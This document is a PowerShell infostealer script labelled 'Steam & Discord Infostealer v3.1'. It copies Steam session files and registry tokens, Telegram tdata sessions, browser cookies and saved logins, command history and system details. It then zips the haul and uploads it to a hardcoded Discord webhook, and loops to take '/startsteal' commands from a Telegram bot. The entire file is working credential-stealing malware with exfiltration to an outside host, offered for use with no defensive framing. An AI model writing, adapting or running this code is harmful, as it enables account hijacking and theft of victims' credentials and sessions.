# Steam & Discord Infostealer v3.1 - Token Grabber
# Set parameters
$discordWebhook = "https://discord.com/api/webhooks/1407258124850827396/kkhtvS5us7fN17u9s89uicI8K8Yf29oE-KWmi39NEzVHvQ1DfNwLrZcAIKYhXZI5Vtbk"
$telegramBotToken = "YOUR_TELEGRAM_BOT_TOKEN"
$telegramChatID = "YOUR_TELEGRAM_CHAT_ID"
$tempDir = "$env:TEMP\SteamLogs"
$zipPath = "$env:TEMP\SteamData_$((Get-Date).ToString('yyyyMMdd_HHmmss')).zip"
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null

# 1. Function to capture PowerShell command history
function Get-CommandHistory {
    Get-Content (Get-PSReadlineOption).HistorySavePath | Out-File "$tempDir\PowerShell_History.txt"
}

# 2. Function to steal Steam files & configs for FULL ACCESS
function Get-SteamData {
    $steamPaths = @("$env:ProgramFiles(x86)\Steam", "${env:ProgramFiles}\Steam", "$env:USERPROFILE\AppData\Local\Steam")
    foreach ($path in $steamPaths) {
        if (Test-Path $path) {
            # Copy entire config directory
            Copy-Item "$path\config\*" $tempDir -Recurse -Force -ErrorAction SilentlyContinue
            # Copy all ssfn files (Steam guard)
            Copy-Item "$path\ssfn*" $tempDir -Force -ErrorAction SilentlyContinue
            # Copy loginusers.vdf and all userdata
            Copy-Item "$path\logs\*" $tempDir -Recurse -Force -ErrorAction SilentlyContinue
            Copy-Item "$path\userdata\*" $tempDir -Recurse -Force -ErrorAction SilentlyContinue | Out-Null
        }
    }
}

# 3. NEW FUNCTION: Dedicated Steam Token Grabber
function Get-SteamTokens {
    $tokenFile = "$tempDir\Steam_Tokens.txt"
    "=== Steam Tokens & Session Data ===`r`n" | Out-File $tokenFile -Append

    # A. Extract from Registry
    "Registry Tokens:`r`n" | Out-File $tokenFile -Append
    try {
        $regPath = "HKCU:\Software\Valve\Steam"
        $regKeys = Get-ItemProperty -Path $regPath -ErrorAction SilentlyContinue
        $regKeys | Out-File $tokenFile -Append
    } catch {}

    # B. Extract from config files
    "`r`nConfig File Data:`r`n" | Out-File $tokenFile -Append
    $configFiles = Get-ChildItem -Path $tempDir -Include *.vdf -Recurse
    foreach ($file in $configFiles) {
        if ($file.Name -like "*loginusers*" -or $file.Name -like "*config*") {
            "--- $($file.Name) ---" | Out-File $tokenFile -Append
            Get-Content $file.FullName | Out-File $tokenFile -Append
        }
    }

    # C. Extract from process memory (active sessions)
    "`r`nActive Session Info:`r`n" | Out-File $tokenFile -Append
    $steamProcess = Get-Process steam -ErrorAction SilentlyContinue
    if ($steamProcess) {
        netstat -ano | findstr ":$steamProcess.Id" | Out-File $tokenFile -Append
        $steamProcess.Modules | Where-Object {$_.ModuleName -like "*steam*"} | Select-Object ModuleName, FileName | Out-File $tokenFile -Append
    }
}

# 4. Function to steal Telegram sessions
function Get-TelegramData {
    $telegramPaths = @("$env:USERPROFILE\AppData\Roaming\Telegram Desktop", "$env:USERPROFILE\Documents\Telegram Desktop")
    foreach ($path in $telegramPaths) {
        if (Test-Path $path) {
            # Target tdata directory for session hijacking
            Copy-Item "$path\tdata\*" $tempDir -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

# 5. Function to steal cookies & passwords from all browsers
function Get-BrowserData {
    $browsers = @("Chrome", "MicrosoftEdge", "Firefox", "Opera", "YandexBrowser")
    foreach ($browser in $browsers) {
        try {
            $dataPath = "$env:USERPROFILE\AppData\Local\$browser\User Data\Default"
            if (Test-Path $dataPath) {
                Copy-Item "$dataPath\Cookies" "$tempDir\${browser}_Cookies" -Force -ErrorAction SilentlyContinue
                Copy-Item "$dataPath\Login Data" "$tempDir\${browser}_LoginData" -Force -ErrorAction SilentlyContinue
                Copy-Item "$dataPath\Local Storage" "$tempDir\${browser}_LocalStorage" -Recurse -Force -ErrorAction SilentlyContinue
            }
        } catch {}
    }
}

# 6. Collect system info and network data
function Get-SystemInfo {
    systeminfo | Out-File "$tempDir\SystemInfo.txt"
    (Get-WmiObject -Class Win32_ComputerSystem).Model | Out-File "$tempDir\PC_Model.txt"
    ipconfig /all | Out-File "$tempDir\Network_Info.txt"
    netstat -ano | Out-File "$tempDir\Open_Ports.txt"
}

# 7. Create a ZIP archive of all stolen data
function Compress-Data {
    Compress-Archive -Path "$tempDir\*" -DestinationPath $zipPath -Force
}

# 8. Function to send data via Discord webhook
function Send-DiscordWebhook {
    $fileBytes = [System.IO.File]::ReadAllBytes($zipPath)
    $fileEnc = [System.Text.Encoding]::GetEncoding("ISO-8859-1").GetString($fileBytes)
    $boundary = [System.Guid]::NewGuid().ToString()
    $bodyLines = (
        "--$boundary",
        "Content-Disposition: form-data; name=`"file`"; filename=`"$(Split-Path $zipPath -Leaf)`"",
        "Content-Type: application/zip`r`n",
        $fileEnc,
        "--$boundary--"
    ) -join "`r`n"
    Invoke-RestMethod -Uri $discordWebhook -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines
}

# 9. Telegram bot control - Check for commands
function Check-TelegramCommand {
    $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$telegramBotToken/getUpdates" -Method Get
    $lastMessage = $updates.result[-1].message.text
    if ($lastMessage -eq "/startsteal") {
        Execute-Stealer
        Send-DiscordWebhook
        Send-TelegramMessage "Stealer executed. Data sent to Discord."
    }
}

# 10. Send message via Telegram
function Send-TelegramMessage {
    param($message)
    Invoke-RestMethod -Uri "https://api.telegram.org/bot$telegramBotToken/sendMessage?chat_id=$telegramChatID&text=$message" -Method Get
}

# Main execution
function Execute-Stealer {
    Get-CommandHistory
    Get-SteamData
    Get-SteamTokens
    Get-TelegramData
    Get-BrowserData
    Get-SystemInfo
    Compress-Data
}

# Run once and wait for Telegram commands in a loop
Execute-Stealer
Send-DiscordWebhook
while ($true) {
    Check-TelegramCommand
    Start-Sleep -Seconds 60
}
